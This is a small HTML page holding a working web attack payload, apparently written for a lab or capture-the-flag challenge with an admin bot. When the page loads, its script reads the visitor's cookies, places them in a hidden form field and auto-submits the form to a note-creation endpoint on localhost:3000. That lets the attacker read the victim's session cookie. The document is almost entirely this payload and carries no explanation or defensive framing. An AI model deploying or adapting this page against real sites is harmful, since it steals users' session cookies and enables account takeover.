<!DOCTYPE html>
<html>
  <body>
    <form action="http://localhost:3000/note/new" method="POST">
      <input type="hidden" name="note" id="noteInput">
    </form>

    <script>
      // Insert the cookie into the note content
      document.getElementById("noteInput").value = "Bot cookie: " + document.cookie;

      // Auto-submit the form
      document.forms[0].submit();
    </script>
  </body>
</html>
